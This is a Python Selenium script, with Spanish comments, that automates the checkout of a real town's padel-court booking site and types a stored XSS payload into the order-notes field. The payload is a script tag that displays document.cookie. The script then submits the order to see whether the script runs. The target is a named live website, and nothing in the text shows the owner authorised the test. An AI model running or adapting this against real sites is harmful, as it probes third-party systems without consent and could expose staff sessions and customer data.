from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

def configurar_driver():
    """Configura Chrome con opciones para que funcione correctamente"""
    chrome_options = Options()
    
    # Configuraciones para asegurar que Chrome funcione bien
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-web-security")
    chrome_options.add_argument("--allow-running-insecure-content")
    chrome_options.add_argument("--disable-extensions")
    
    # Asegúrate de que NO esté en modo headless
    # chrome_options.add_argument("--headless")  # NO agregues esta línea
    
    # Configura una ventana visible
    chrome_options.add_argument("--window-size=1280,720")
    
    driver = webdriver.Chrome(options=chrome_options)
    return driver

def probar_xss_simple():
    """Prueba XSS de forma más confiable"""
    driver = configurar_driver()
    
    try:
        print("🔍 Probando XSS con configuración mejorada...")
        print("Abriendo página de reservas...")
        
        # Va directamente a la página principal primero
        driver.get("https://www.horcajodesantiago.es")
        time.sleep(3)
        
        print("✓ Página principal cargada")
        print("URL actual:", driver.current_url)
        
        # Ahora va a la página de reservas
        driver.get("https://www.horcajodesantiago.es/reserva-pistas/pista-de-padel/")
        time.sleep(5)
        
        print("✓ Página de reservas cargada")
        print("Título de la página:", driver.title)
        
        # Verifica que la página se cargó correctamente
        if "horcajo" in driver.title.lower() or "padel" in driver.title.lower():
            print("✅ La página se cargó correctamente")
        else:
            print("⚠️ La página puede no haberse cargado bien")
            print("Título actual:", driver.title)
        
        print("\nAhora puedes:")
        print("1. Reservar una pista manualmente en el navegador")
        print("2. Ir a finalizar compra")
        print("3. Luego continuar con el script")
        
        input("\nCuando hayas reservado algo, presiona Enter...")
        
        # Va a finalizar compra
        print("Navegando a finalizar compra...")
        driver.get("https://www.horcajodesantiago.es/reserva-pistas/carrito/finalizar-compra/")
        time.sleep(3)
        
        wait = WebDriverWait(driver, 15)
        
        # Busca el campo de notas
        try:
            campo_notas = wait.until(EC.presence_of_element_located((By.NAME, "order_comments")))
            print("✓ Formulario encontrado")
            
            # Rellena campos básicos
            driver.find_element(By.NAME, "billing_first_name").send_keys("Test")
            driver.find_element(By.NAME, "billing_last_name").send_keys("XSS")
            driver.find_element(By.NAME, "billing_phone").send_keys("123456789")
            driver.find_element(By.NAME, "billing_email").send_keys("test@example.com")
            
            # Payload XSS mejorado (sin emojis para evitar errores)
            payload = "<script>alert('VULNERABILIDAD XSS CONFIRMADA!\\nCookies: ' + document.cookie)</script>"
            campo_notas.send_keys(payload)
            
            print("✓ Formulario rellenado con payload XSS")
            print("Payload usado:", payload)
            
            input("Presiona Enter para enviar y probar XSS...")
            
            # Marca términos si existe
            try:
                driver.find_element(By.NAME, "terms").click()
            except:
                pass
            
            # Envía formulario
            driver.find_element(By.ID, "place_order").click()
            
            print("✅ Formulario enviado")
            print("Observa si aparece la alerta con las cookies...")
            
            time.sleep(10)
            
        except Exception as e:
            print(f"❌ Error: {e}")
            print("Puede que necesites añadir algo al carrito primero")
            
    except Exception as e:
        print(f"Error general: {e}")
        
    input("Presiona Enter para cerrar el navegador...")
    driver.quit()

if __name__ == "__main__":
    probar_xss_simple()
